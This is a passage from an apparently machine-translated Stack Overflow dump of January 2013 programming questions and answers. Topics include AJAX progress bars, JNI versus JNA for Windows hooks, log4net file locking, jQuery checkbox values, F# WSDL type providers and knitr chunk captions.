<div id="meter-value" style="background-color: #0a0; width: 0%;"> 
```

之后你应该改变这个：

```
document.getElementById('ReloadThis').innerHTML = $http.responseText; 
```

为了这：

```
document.getElementById('meter-value').style.width = $http.responseText + '%'; 
```

我认为这应该有效。

您可以了解有关使用 JavaScript 设置 html 元素样式的更多信息：[样式对象 - w3schools.com](http://www.w3schools.com/jsref/dom_obj_style.asp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:00:16.160

这不会像您期望的那样工作。

当像这样使用 ajax 时，您向 php 文件发送请求，它完成脚本并返回值（如果有任何回显）。用这个来取得进步是不可能的。这就是为什么显示进度条的上传表单通常是用 Java 或 Flash 编写的。

您正在尝试解析 readyState，但这些值仅表示 ajax 调用是否已完成、失败或挂起。

您可以四处搜索并找到一些如何执行此操作的示例，但这比在 ajax 脚本运行时显示简单的 loading-gif 困难得多。

编辑：使这项工作需要您例如将脚本分成块并使用`ob_flush`或类似的东西回显每个处理过的块。

# java - Accessing Windows API from a Java application - JNI or JNA?

> ID：14346761
> 
> 赞同：3
> 
> 时间：2013-01-15T20:56:04.380
> 
> 标签：java, winapi, java-native-interface, native, jna

**For an exercise**, I would like to develop an application in Java that can make calls to Windows API and register itself for notification on events like key press.

From researches done earlier, I understand that the specific Windows API suitable for my need is the [SetWindowsHookEx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644990%28v=vs.85%29.aspx) function.

**Some have suggested using JNI for this, and others JNA. For the scenario I have described, What are the pros and cons for using either JNI or JNA?**

I need opinions on how best to approach solving this problem.

Please do note guys, that I am aware that C/C++ would be most suitable for what I am doing. But like I stated right from the beginning - I am doing this as an exercise, and thus I want to accomplish it using Java.

* * *

This question is not a duplicate of [Calling Win32 API method from Java](https://stackoverflow.com/questions/2389156/calling-win32-api-method-from-java), for the following reasons:

*   My question asks, what are the pros and cons of using JNI or JNA.
*   The other questions asks

    > how to call an already existing DLL from Java

They are just not the same questions.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T22:10:07.737

For general-purpose invocation of native code, JNA tends to be much easier, because you don't have to write a C/C++ stub.

However, it's not always possible to do what you need via JNA. Let me explain why:

I think that for what you want to do, JNI is going to be required. The issue is that SetWindowsHookEx takes parameters including a pointer to the hook procedure and a handle to the DLL that contains the hook procedure. Windows will be using that info to invoke the hook procedure. As you might imagine, Windows is not going to be able call directly into a method of an object in the JVM.

So, I believe that you're going to have to use JNI to write a dll that will sit between your java app and the Windows API. That dll will contain the actual hook process, and will invoke SetWindowsHookEx for you. The dll's hook process can then use JNI to invoke your java object.

# websocket - Adobe CQ5.5 中的 Websocket

> ID：14346762
> 
> 赞同：1
> 
> 时间：2013-01-15T20:56:14.803
> 
> 标签：websocket, aem

我正在尝试在 Adob​​e CQ5.5 (felix) 中设置 websocket 服务器。我查看了几个 java 实现，例如 jwebsocket，但它们似乎都需要一个应用服务器或至少一个 servlet 容器才能在其上运行。我查看了 apache2 模块，但它在 C 中，我需要一个 java 实现。有没有可以轻松与CQ5.5集成的解决方案？我可以尝试在 glassfish 或其他东西中运行 Adob​​e CQ5.5，但这可能很难，因为我们不使用 glassfish 并且需要获得许可证。我可以在 felix 中实现 websockets 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T15:25:05.793

CQ 默认在 Felix 中使用它自己的 web 容器，我不相信它支持 websockets。但是，您可以将 CQ 部署到另一个容器中，例如支持 Web 套接字的 Jetty。然而，Jetty 并未得到完全支持，属于[预期的工作](http://dev.day.com/docs/en/cq/current/deploying/technical_requirements.html)类别（请参阅 SERVLET ENGINES / APPLICATION SERVERS 部分）。

或者，*可以*将码头加载到 felix OSGI 容器中，并通过 CQ 使用的端口以外的端口提供 websocket。

# c# - 这在 C# 中被认为是一种不好的做法吗？

> ID：14346769
> 
> 赞同：0
> 
> 时间：2013-01-15T20:56:32.623
> 
> 标签：c#, .net, events

我的英语不太好，我主要用java开发，我试图为clickevent创建一个外部均衡器，但我一直觉得它是错误的。

这是我的例子：表格..

```
public partial class MainFrame : System.Windows.Forms.Form
{
    private System.ComponentModel.Container components = null;
    private System.Windows.Forms.Button startButton;

    public MainFrame()
    {
        initGUI();
    }

    private void initGUI()
    {
        this.components = new System.ComponentModel.Container();

        this.Text = "CustomGUI";

        ShowIcon = false;

        this.startButton = new System.Windows.Forms.Button();
        startButton.Text = "Start";
        startButton.SetBounds(0, 0, 100, 25);

        this.Controls.Add(this.startButton);

        MainEventListener listen = new MainEventListener();
        startButton.Click += listen.startClicked;

    }

} 
```

下一个：听者..

```
class MainEventListener
{

    public void startClicked(object sender, System.EventArgs e)
    {
        Application.Exit();
    }

} 
```

最后：主要方法..

```
 class ApplicationStarter
{

    static void Main(string[] args)
    {
        MainFrame frame = new MainFrame();
        System.Windows.Forms.Application.Run(frame);
    }
} 
```

我一直觉得我做错了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:58:24.803

1.  你不必自己写这一切。Visual Studio 提供了一个模板和一个设计器来管理所有的表单初始化和配置代码。（部分类中的 InitGUI => InitializeComponent）。

2.  在 C# 中，您不必创建 Listener 类。只需使用事件。

# nhibernate - QueryOver API 中的 SQL Where 表达式

> ID：14346772
> 
> 赞同：3
> 
> 时间：2013-01-15T20:56:50.860
> 
> 标签：nhibernate, queryover

我正在使用 QueryOverApi，试图在 where 子句中使用 SQL 表达式。我基本上有：

```
 var query = CurrentSession.QueryOver<Appointment>(() => appt)
            .JoinAlias(() => appt.Work, () => work)
            .JoinAlias(()=>appt.Contact,()=>ct)
            .JoinAlias (()=>ct.Tags,()=>tag)
            .Where(Expression.Sql("(ct2_.OrganizationId in (SELECT....")) 
```

这可行，但我不得不硬编码我的别名 ct2_。我如何才能确定 nHibernate 会将我的联系人表别名为 ct2。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:17:57.347

你不能，至少以任何官方方式。在此处查看有人提供补丁的未解决问题：[https ://nhibernate.jira.com/browse/NH-1432](https://nhibernate.jira.com/browse/NH-1432)

# embedded-linux - 为什么这个嵌入式 linux top 命令会失败？

> ID：14346773
> 
> 赞同：2
> 
> 时间：2013-01-15T20:56:51.857
> 
> 标签：embedded-linux, busybox, top-command

我试图用来`top`证明我`test`在 Leopardboard (embedded-linux) 目标上的进程存在内存泄漏。为什么这个命令

```
/ # top -b | grep test >> /media/top.txt & 
```

好像马上就这样死了？

```
[3]+  Stopped (tty output)       top -b | grep test 1>>/media/top.txt 
```

我看到它产生了一个空文件

```
-rwxr-xr-x    1 root     root             0 Jan 15 15:35 top.txt 
```

Top 确实以交互模式运行，产生这样的输出

```
 1079     1 root     S    83668 289%  17% test 
```

但我需要记录这个过程在很长一段时间内内存发生的情况以归档。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T03:16:33.297

听起来你有一个错误的 {top|shell|grep} 可能的顺序；）让我猜这是一个基于busybox的系统？

也许更好的选择是编写一个简单的脚本来通过 /proc 文件系统监视进程的直接统计信息。您可能感兴趣的一些条目

/proc//maps - 有关当前映射的内存区域的信息

/proc//smaps - 每个进程映射的内存消耗

/proc//stat - 一些有用的统计数据，包括驻留集大小（当前总内存使用量）

手册页 proc(5) 有更多关于这些 /proc/ 条目中包含哪些信息的信息。

狩猎愉快！

# jar - 从命令提示符运行 jar 文件

> ID：14346778
> 
> 赞同：0
> 
> 时间：2013-01-15T20:57:07.673
> 
> 标签：jar, command-prompt, beanshell

所以我已经将我的 jar 文件存储在 C:\Java\jdk1.6.0_26-32\jre\lib\ext

以下命令是否正确：

```
Java -cp C:\Java\jdk1.6.0_26-32\jre\lib\ext\bsh-2.0b4.jar 
```

好像没有运行jar文件

PS：请提供有用的注释，而不是简单地否决这个问题，我还是这个网站的新手。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:09:18.993

搜索“运行 jar 文件命令行”会产生这个链接（[http://www.javaworld.com/javatips/jw-javatip127.html](http://www.javaworld.com/javatips/jw-javatip127.html)），说运行这个命令： `java -jar myjar.jar`

运行`java -help`会产生更多信息，在线文档将向您解释所有命令行选项（例如[Oracle 的 java 命令文档](http://docs.oracle.com/javase/7/docs/technotes/tools/windows/java.html)）。

# c++ - 比较指针。多重继承问题？

> ID：14346779
> 
> 赞同：1
> 
> 时间：2013-01-15T20:57:11.070
> 
> 标签：c++, pointers, multiple-inheritance

我正在调试一些代码。执行到了这个方法：

```
void EventNotifier::notify_observers(SpEventInfo pEvent, Observable* target)
{
    std::list<Observer*>::iterator it;
    for (it = m_observers.begin(); it != m_observers.end(); ++it)
    {
        Observable* observedTarget = (*it)->target();
        bool fNotify = (observedTarget == target);
        ... 
```

之前摘录的最后一句已被执行。两个变量，observedTarget 和 target，具有相同的值，但布尔 fNotify 为假！涉及的“目标”对象使用多重继承，“可观察”是父对象之一。但是一切都被转换为 Observable，所以比较应该只是相同类型的指针。事实上，调试器为两个指针显示相同的值。

我不知道是问题所在。非常感谢任何帮助。谢谢

塞西里奥·萨尔梅隆

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:04:05.173

> 两个变量，observedTarget 和 target，具有相同的值，但布尔 fNotify 为假！

您可能想通过添加打印语句来检查代码：

```
printf("%p == %p is %d\n", observedTarget, target, int(fNotify)); 
```

> 涉及的“目标”对象使用多重继承，“可观察”是父对象之一。

`Observable`如果对象可能不止一次派生，那么您可能希望比较完整派生对象的地址。`dynamic_cast<void*>(ptr)`返回由 引用的完整派生对象的地址`ptr`，因此：

```
bool fNotify = dynamic_cast<void*>(observedTarget) == dynamic_cast<void*>(target); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:25:22.573

如果在转换指针时使用了错误的类型转换，无论是在函数参数中还是在 的返回值中`target()`，都可能会得到一个损坏的指针。`dynamic_cast`是最好的，也`static_cast`应该是安全的。`reinterpret_cast`可能会导致问题，并且旧的 C 样式转换可能`reinterpret_cast`取决于它的使用方式。如果您没有使用显式强制转换，那也应该没问题，自动转换将始终是安全的。

当您第一次发现将指针转换为继承树中的不同类型可以更改指针值时，您会感到惊讶。

# javascript - 哪些浏览器支持 bind()？

> ID：14346781
> 
> 赞同：11
> 
> 时间：2013-01-15T20:57:27.920
> 
> 标签：javascript

我必须在下面的方法中使用 bind() 。我只想支持IE10及以上。谁能验证 IE10 何时或是否支持 bind()？

```
 // Verify console exists
    ...    
    if (window.console) {
        logger = window.console.log.bind(window.console);
        // bind needed for Safari but not FF, possible IE issue?
    } else {
        return false; // window.console not available, silent fail
    }
    ... 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-15T21:02:17.483

`bind`自版本 .IE 起已在 IE 中得到支持`9`。看看这个兼容性表，链接自 MDN 文档`bind`：http: [//kangax.github.com/es5-compat-table/](http://kangax.github.com/es5-compat-table/)

# c++ - 串联 3 个 C++ 程序

> ID：14346786
> 
> 赞同：3
> 
> 时间：2013-01-15T20:57:30.933
> 
> 标签：c++, pipe

我是一个学习 C++ 的 Python 和 Lisp 人，并且由于缺乏更精确的术语，3 个 C++ 程序而需要“连接”。我不确定执行以下操作的最佳方法是什么：

1）pocketsphinx 从麦克风获取输入，进行实时自动语音识别，将文本输出到终端，我想将输出发送到输入：

2）Chatscript，一个聊天程序，它解析传入的文本（此时来自键盘）并生成一个发送到终端的响应，我想将输出发送到输入：

3) Festival，文本到语音，从终端读取文本输入并生成该文本的语音输出。

我正在探索不同的方法来做到这一点，据我了解，我可以运行从 pocketsphinx 到 Chatscript 到 Festival 的管道，但是我读过的一些内容让我相信由于开销，这是一种效率较低的方法。另外，关于管道，我认为我会用文本输出设置 2 个单向管道（pid == 0）是否正确？

我想我可以（一旦我学到了很多东西）通过基本上确定所需的库/文件等并在更改输出语句时“连接”三个 void main() 来组合所有 3 个程序（它们都是开源的）？

有人可以就此提供一些指导/指导，并就这些（或建议其他方法）中的哪一个（或建议其他方法？）将是最经济和有效的吗？

问候，理查德

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:13:25.117

注意源中的 cout 或 printf ，并将其添加到缓冲区字符串变量中，这将允许您每次缓冲区填充时，您可以调用下一个程序并使用获得的缓冲区执行它。如果您不需要“实时”处理，您可以执行@zch 指出的操作，因为如果我记得（我可能错了）管道需要程序在将数据发送到下一个二进制文件之前结束。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:07:21.243

采用 ”？” 您可以使用“|”一起运行多个程序 使用前面的输出作为后面程序的输入

# c++ - 在不处理它的应用程序中使用 unicode/UTF8 处理/清理用户输入

> ID：14346792
> 
> 赞同：1
> 
> 时间：2013-01-15T20:57:45.923
> 
> 标签：c++, linux, unicode, utf-8

我在 linux 中有一个不处理 unicode/UTF8 的控制台应用程序，并且我没有实施它的计划，因为除了这个问题之外没有必要。

用户正在将命令输入到不包含 ascii 字符的提示中，这导致了数据的神秘问题以及应该只包含 ascii 字符的文本配置文件中的问题。

处理这个问题的最佳方法是什么？是否有一种不太复杂的方法可以将 unicode 字符串转换回 ascii 或删除任何无法使用 ascii 字符集的可见部分打印的字符？

Unicode 对我来说似乎是一场彻头彻尾的噩梦。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T21:01:17.030

UTF-8 和许多单字节字符集与 ASCII 兼容，0-127 之间的值代表正确的 ASCII 字符。（在 UTF-8 的情况下，具有多字节序列的字符的每个字节都在此范围之外。）过滤掉其余的可以解决您的问题。

不过，您绝对应该改变态度并支持 UTF-8。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:43:01.833

如果需要 ASCII，则测试并拒绝 0-127 之外的任何 char 值作为无效输入。在这种情况下，我不坚持传统的[稳健性原则](http://en.wikipedia.org/wiki/Robustness_principle)；代码应该[很快失败](http://en.wikipedia.org/wiki/Fail-fast)。试图按摩模棱两可的数据会导致[奇怪的行为](http://blogs.msdn.com/b/oldnewthing/archive/2007/04/17/2158334.aspx)。

*当然，很大程度上取决于域，但这是我的默认方法。先严格后放宽条件要比松懈后尝试应用限制来破坏以前工作的代码/配置更容易。*

# database - Thinking Sphinx 没有返回运行 rake thinking_sphinx:index 后添加的结果

> ID：14346796
> 
> 赞同：0
> 
> 时间：2013-01-15T20:57:57.643
> 
> 标签：database, ruby-on-rails-3, thinking-sphinx

由于某种原因，没有显示在 rake thinking_sphinx:index（或配置）之后添加到数据库的用户。我尝试重新启动服务器，停止思考狮身人面像然后重新启动和配置。仍然遇到同样的问题。

当我运行 rails c 并执行 User.search 时，我只能从运行索引/配置之前创建的数据库中获取结果。

我刚刚刷新了数据库以通过运行将这个项目投入生产。

```
rake db:reset 
```

然后我重新启动了服务器，我遇到了这个问题。当我运行配置时，我在我的 searchd.log 文件中得到了这个：

```
[Tue Jan 15 18:56:02.491 2013] [ 1742] rotating indices (seamless=1)
[Tue Jan 15 18:56:02.499 2013] [ 1742] rotating index 'user_core': success
[Tue Jan 15 18:56:02.506 2013] [ 1742] rotating index 'synonym_delta': success
[Tue Jan 15 18:56:02.512 2013] [ 1742] rotating index 'synonym_core': success
[Tue Jan 15 18:56:02.519 2013] [ 1742] rotating index 'bar_delta': success
[Tue Jan 15 18:56:02.525 2013] [ 1742] rotating index 'bar_core': success
[Tue Jan 15 18:56:02.525 2013] [ 1742] rotating finished 
```

这在 searchd.query.log 中：

```
[Tue Jan 15 18:56:06.556 2013] 0.000 sec [ext/2/rel 8 (0,20)] [user_core]
[Tue Jan 15 18:56:06.566 2013] 0.001 sec [ext/2/rel 8 (0,20)] [user_core]
[Tue Jan 15 18:56:06.575 2013] 0.000 sec [ext/2/rel 8 (0,20)] [user_core] 
```

在刷新数据库并重新启动服务器之前，我从来没有遇到过搜索不返回更新结果的问题。在此期间，没有任何代码被更改。任何关于可能是什么问题的见解将不胜感激。另外，如果您需要更多细节，请告诉我，我可以发布更多信息。我不愿意张贴太多，甚至让人们无法阅读。所以让我知道什么有助于更好地理解我的问题。

**更奇怪的是，我在使用任何其他模型（例如场地）时都没有遇到这个问题。保存到数据库后通过搜索更新和显示...

- - - - - - - - - - - - - - 更新 - - - - - - - - - - - --------------

所以我运行了 rails 控制台，如果我运行

```
User.search 
```

我得到 10 个结果，以在运行 ts:rebuild 之前添加的最后一行结束。但是当我运行时：

```
User.all 
```

我得到了 11 个结果，其中包括数据库中的所有行。不管最后一次运行 ts:rebuild / index / configure ...

谢谢

艾伦

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:05:43.787

也许我不明白。当您通过 rake ts:build 构建索引时，然后您有新用户注册您的 Web 应用程序或其他任何内容，他们不应该出现在 sphinx 索引文件中。无需您执行 rake ts:rebuild 就可以显示它们的唯一方法是，如果您正在运行 delta 索引，这会思考 sphinx 支持，这将创建 delta 索引文件，然后将这些文件合并到您的主索引文件中一次你做一个 rake ts:rebuild。

# java - 有什么方法可以重定向本机 JVM 输出的输出，例如 -XX:+PrintCompilation

> ID：14346797
> 
> 赞同：3
> 
> 时间：2013-01-15T20:57:58.110
> 
> 标签：java, debugging, jvm-hotspot, sun

一些热点 JVM 标志，例如`-XX:+PrintCompilation`，会导致输出出现在 stdout 或 stderr 上。与 GC 相关的输出，例如由 -verbose:gc 启用的输出，可以使用 重定向`-Xloggc:<path>`，但我找不到任何方法来重定向其他本机输出，除了重定向整个过程（由于某些原因，这可能是不可取的，例如以及捕获所有 System.out 输出）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T21:09:12.457

+PrintCompilation 使用，从[openjdk 源代码](http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/tip/src/share/vm/code/nmethod.cpp)`print_on(tty, message)`可以看出，直接打印到 tty，所以我认为重定向整个过程输出是您唯一的选择，而无需重新编译编译器。

# javascript - 未正确传递复选框-html 表单的值（使用 javascript）

> ID：14346807
> 
> 赞同：0
> 
> 时间：2013-01-15T20:58:44.147
> 
> 标签：javascript, jquery, forms

我已经为此工作了一段时间并放弃了，因为我无法弄清楚，但现在我又回到了它。我的网站上有一个电子邮件通讯注册表格，我有一个复选框供人们检查他们是否对我的音乐课感兴趣。我希望表单的工作方式是，如果他们对课程不感兴趣，我将没有任何价值，但如果他们对课程感兴趣，我会得到“对课程感兴趣 - $city”。现在，在这两种情况下，我都对课程感兴趣 - $city。

表单有点复杂，因为我使用的是 javascript 以及常规的 html 代码（隐藏 div 等），所以我想我在那里感到困惑。

表格：

```
<form action="../index_success.php" method="post" id="sendEmail" class="email">
            <h3 class="register2">Newsletter Signup:</h3>
            <ul class="forms email">
                <li class="name">
                    <label for="yourName">Name: </label>
                    <input type="text" name="yourName" class="info" id="yourName" value="<?php echo $_POST['yourName']; ?>" /><br />
                </li>
                <li class="city"><label for="yourCity">City: </label>
                    <input type="text" name="yourCity" class="info" id="yourCity" value="<?php echo $_POST['yourCity']; ?>" /><br />
                </li>
                <li class="classes"><label for="classInterest">Interested in classes?: </label>
                    <input type="checkbox" name="classInterest" class="info" id="classInterest" value="Yes" /><br />
                </li>
                <li class="email">
                    <label for="emailFrom">Email: </label>
                    <input type="text" name="emailFrom" class="info" id="emailFrom" value="<?php echo $_POST['emailFrom']; ?>" />
                     <?php if(isset($emailFromError)) echo '<span class="error">'.$emailFromError.'</span>';

                     ?>
                </li>
                <li class="buttons email">
                     <button type="submit" id="submit">Send</button>
                     <input type="hidden" name="submitted" id="submitted" value="true" />
                </li>
            </ul>
        </form> 
```

javascript-如果此代码与问题无关，我深表歉意-我还是很新，所以我发现最好包含太多而不是不够！（我正在使用 jQuery）：

```
 <script type="text/javascript">
$(document).ready(function(){

 $('#emailFrom')
  .focus(function(){
   if ($('#overlay').length) { return; } // don't keep adding overlays if one exists
   $('#sendEmail')

    .find('.name, .city, .classes').slideDown(300, function(){ $(this).show(); });
   $('.outeremailcontainer').css({ position: 'relative', bottom: 0, left: 0, zIndex : 1001 });
   $('<div id="overlay"></div>').appendTo('body');
  });

 $('#overlay').live('click', function(){
   $('#sendEmail')
    .css({ backgroundColor : 'transparent' })
    .find('.name, .city, .classes').slideUp(300);
   $('.outeremailcontainer').css({ position : 'static' });
   $('#overlay').remove();
  });

});
</script> 
```

这是用于检查表单上的错误并通过电子邮件设置兴趣类值的 javascript `classInterestVal`：

```
$(document).ready(function(){
  $("#submit").click(function(){
    $(".error").hide();
    var hasError = false;
    var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;

    var emailFromVal = $("#emailFrom").val();

    if(emailFromVal == '') {
      $("#emailFrom").after('<span class="error"><br />You forgot to enter the email address to send from.</span>');
      hasError = true;

    } else if(!emailReg.test(emailFromVal)) {
      $("#emailFrom").after('<span class="error"<br />>Enter a valid email address to send from.</span>');
      hasError = true;
    }

    var yourNameVal = $("#yourName").val();
    if(yourNameVal == '') {
        $("#yourName").after('<span class="error"><br />You forgot to enter your name.</span>');
        hasError = true;
    }

    var yourCityVal = $("#yourCity").val();
    if(yourCityVal == '') {
        $("#yourCity").after('<span class="error"><br />You forgot to enter your city.</span>');
        hasError = true;
    }
    var classInterestVal = $("#classInterest").val();

    if(hasError == false) {
      $(this).hide();
      $("#sendEmail li.buttons").append('<img src="/wp-content/themes/default/images/template/loading.gif" alt="Loading" id="loading" />');
      $.post("/includes/sendemail.php",
//emailTo: emailToVal, 
           { emailFrom: emailFromVal, yourName: yourNameVal, yourCity: yourCityVal, classInterest: classInterestVal },
             function(data){
            $("#sendEmail").slideUp("normal", function() {
              $("#sendEmail").before('<h3 class="register2">Thank you!  You\'re on the email list!</h3><p class="emailbox">Click <a href="http://rattletree.com/Songs/Live_EP/Chikende.mp3">HERE</a> for your free song.</p>');
            });
             }
         );
    }
    return false;
  });
}); 
```

最后是 sendEmail.php（这是我放置条件的地方`$classInterest`）：

```
 <?php 
$mailTo = 'email@address.com'; // This is the hardcoded Recipient Address 
$mailSubject = 'Newsletter'; // This is the hardcoded Subject
$mailFrom = $_POST['emailFrom']; 
$yourName = $_POST['yourName']; 
$yourCity = $_POST['yourCity'];

if (isset($_POST['classInterest']) && $_POST['classInterest'] == 'Yes'){
                            $classInterest ="Class Interest - " . $yourCity;
                        }
                        else {
                            $classInterest = '';
                        }
$mailHeader = "From: {$mailFrom}"; 
$mailBody = "Name = {$yourName} City = {$yourCity} Class interest = {$classInterest}";

mail( $mailTo , $mailSubject , $mailBody , $mailHeader );
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:03:31.970

从 classInterest 获取 .val() 将始终返回值，无论是否检查。您需要做的是 $("#classInterest").is(":checked") 这将返回一个布尔值，告诉您复选框是否被选中。

将来调试此类问题的一个好方法是在具有开发工具 (F12) 的 Chrome 等浏览器中查看网络选项卡。这将允许您查看您传递的信息，以便您可以看到错误发生的位置。

如果您想要该值，请执行以下操作：

```
var classInterest = $("#classInterest");
var classInterestVal = classInterest.is(":checked") ? classInterest.val() : ""; 
```

为了提高效率，我在这里缓存了 classInterest 选择器。

# f# - F# WSDL 类型提供程序和 Confluence

> ID：14346810
> 
> 赞同：4
> 
> 时间：2013-01-15T20:58:49.393
> 
> 标签：f#, confluence, type-providers

当我使用 WSDL 类型提供程序为[Confluence](http://en.wikipedia.org/wiki/Confluence_%28software%29) SOAP 服务创建客户端时，我会得到所有带有 (unit -> unit) 签名的方法。

```
#r "System.ServiceModel.dll"
#r "FSharp.Data.TypeProviders.dll"
open System.ServiceModel
open Microsoft.FSharp.Data.TypeProviders

[<Literal>]
let ConfluenceServiceWsdl = "https://developer.atlassian.com/rpc/soap-axis/confluenceservice-v2?WSDL"
type ConfluenceService = Microsoft.FSharp.Data.TypeProviders.WsdlService<ConfluenceServiceWsdl>

let service = ConfluenceService.``Getconfluenceservice-v2``()

service.getPages;;
...
val it : (unit -> unit) = <fun:it@3-1> 
```

但它应该类似于 `Vector<PageSummary> getPages(String token, String spaceKey)`- （来自[Remote Confluence Methods](https://developer.atlassian.com/display/CONFDEV/Remote+Confluence+Methods)文档）

我究竟做错了什么？如何打造全功能服务客户端？WSDL 有问题吗？

PS Confluence SOAP WSDL 由[Apache Axis](http://axis.apache.org/)生成。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:25:10.903

看起来像[这个问题](https://jira.atlassian.com/browse/JRA-23963)。作为一种解决方法（一个肮脏的），您可以执行以下操作：

1.  指定 LocalSchemaFile=.wsdlschema 和 ForceUpdate=false
2.  打开.wsdlschema，修复故障对应的消息并添加对应的元素

作为示例：

这

```
<wsdl:message name="VersionMismatchException">
    <wsdl:part name="fault" type="tns1:VersionMismatchException"/>
</wsdl:message> 
```

会变成

```
<wsdl:message name="VersionMismatchException">
    <wsdl:part name="fault" element="tns1:VersionMismatchException"/>
</wsdl:message> 
```

还有这个

```
<complexType name="AlreadyExistsException">
    <complexContent>
        <extension base="tns1:RemoteException">
             <sequence/>
        </extension>
    </complexContent>
</complexType> 
```

将改为

```
<complexType name="AlreadyExistsException">
    <complexContent mixed="false">
        <extension base="tns1:RemoteException">
            <sequence />
         </extension>
     </complexContent>
</complexType>
<element name="AlreadyExistsException" type="tns1:AlreadyExistsException"/> 
```

# log4net - Log4Net：文件句柄什么时候获取和释放？

> ID：14346812
> 
> 赞同：4
> 
> 时间：2013-01-15T20:59:05.147
> 
> 标签：log4net, log4net-configuration, log4net-appender

我是 Log4Net 新手，并试图对其工作原理有一个基本/安全的了解。如果我将我的 Logger 配置为 FileAppender，并且我有多个如下所示的语句，一个接一个：

```
this.GetLogger().Info("...");
this.GetLogger().Error("...."); 
```

每次调用是否实际打开文件、写入字符串并关闭它？每次？或者还有其他事情发生吗？我想知道文件资源何时被使用。它是如何工作的？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-15T21:11:19.587

*文档：*

> 当调用 ActivateOptions 时，此 appender 将首先尝试打开文件进行写入。这通常是在配置期间。如果无法打开文件以写入附加程序，则每次将消息记录到附加程序时，都会尝试再次打开文件。如果在记录消息时无法打开文件进行写入，则此附加程序将丢弃该消息。

换句话说：它会尽可能早地尝试打开文件，因此当您尝试记录时不会产生额外的开销。如果失败，它会在您每次尝试记录任何内容时尝试打开文件。

您可以轻松检查日志记录在您的特定实例中的行为 - 每当打开文件时，布局的 Header 值将被写入文件，每当它关闭时，布局的 Footer 值将被写入。

但是请注意，这是默认行为。`FileAppender`默认使用`FileAppender.ExclusiveLock`锁定模型。另一种选择是`FileAppender.MinimalLock`锁定模型，它尝试在每个日志记录操作之前获取锁并在之后释放它。您可以按如下方式配置您的 appender 以使用它。

```
<appender name="FileAppender" type="log4net.Appender.FileAppender">
    <file value="${TMP}\log-file.txt" />
    <appendToFile value="true" />
    <lockingModel type="log4net.Appender.FileAppender+MinimalLock" />
    <layout type="log4net.Layout.PatternLayout">
        <conversionPattern value="%date [%thread] %-5level %logger [%property{NDC}] - %message%newline" />
    </layout>
</appender> 
```

获取每个日志记录操作的锁显然比默认的“获取一次，释放一次”模型更耗时。但是，这样做是有正当理由的——例如，如果在执行长时间运行的应用程序期间需要轮换日志文件。

# android - Android视口缩放

> ID：14346813
> 
> 赞同：0
> 
> 时间：2013-01-15T20:59:04.820
> 
> 标签：android, zooming, viewport

我是一名 Safari 开发人员，我几乎忽略了 IE。也就是说，我想在 android 等其他设备上支持其他符合标准的浏览器。

我有一个在 Mac、iPhone、iPad 上运行良好的网络应用程序......但在 Android 模拟器中，当它加载时它会放大大约 1/2 的方式。

这里是否有一个神奇的银弹答案可以使这项工作奏效？

以下是在 iPhone 和 iPad 上完美运行的功能：

```
Add_Meta( 'viewport', 'width=1024, user-scalable=no' ) 
```

我使用 1024 是因为该网站是为计算机浏览器宽度设计的，而 iOS 似乎可以完美地缩放它。我不希望用户放大或缩小。

# r - 我可以标记 knitr 代码块和输出并为其添加标题吗？

> ID：14346816
> 
> 赞同：16
> 
> 时间：2013-01-15T20:59:15.173
> 
> 标签：r, latex, label, caption, knitr

除了图形和表格之外，是否可以为 knitr 输出添加标签和引用。我知道我可以`xtable`分别使用`print.xtable`为表格设置标题并按照我的意愿放置它们。可以对数字做类似的事情。但是是否有可能标记和说明仅通过回显某些 R 代码而生成的某些输出？这样我就可以在我的文本中写下这样的内容：`code chunk \ref{mychunk} shows how to do XYZ`.

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-16T04:04:24.857

是的，有可能。请参阅[示例 074](https://github.com/yihui/knitr-examples/blob/master/074-example-environment.Rnw)，了解如何为 R 块定义环境，以便您可以使用交叉引用。要完全理解它，您可能需要阅读[chunk hooks](http://yihui.name/knitr/hooks)的文档。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-03-26T18:03:34.917

我想在标题后面的标题中添加额外的文本，所以在序言中使用它来使用 amsthm 自定义我的代码块标题：

```
\usepackage{amsthm}
\newtheoremstyle{rexample}
    {3pt}%Space above
    {3pt}% Space below
    {}%Body font
    {}%Indent amount
    {\bfseries}%Theorem head font
    {:}%Punctuation after theorem head
    {.5em}%Space after theorem head
    {}%Theorem head spec (can be left empty, meaning `normal')
\theoremstyle{rexample}
\newtheorem{rexample}{Code chunk} 
```

按照示例，我使用带有 options$comment 的 knit_hooks：

```
knit_hooks$set(rexample = function(before, options, envir) {
  if (before) sprintf('\\begin{rexample}%s\\label{%s}\\hfill{}', options$comment, options$label) else '\\end{rexample}'
}) 
```

并且在块定义中，注释被传递以形成标签：

```
<<setup, echo=TRUE, tidy=FALSE, eval=FALSE, rexample=TRUE, comment='Setups for some management functions and database connections'>>= 
```

这给了我一个很好的标题：

[http://gis.washington.edu/phurvitz/knitr/rexample_theorem_caption.png](http://gis.washington.edu/phurvitz/knitr/rexample_theorem_caption.png)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T21:08:59.400

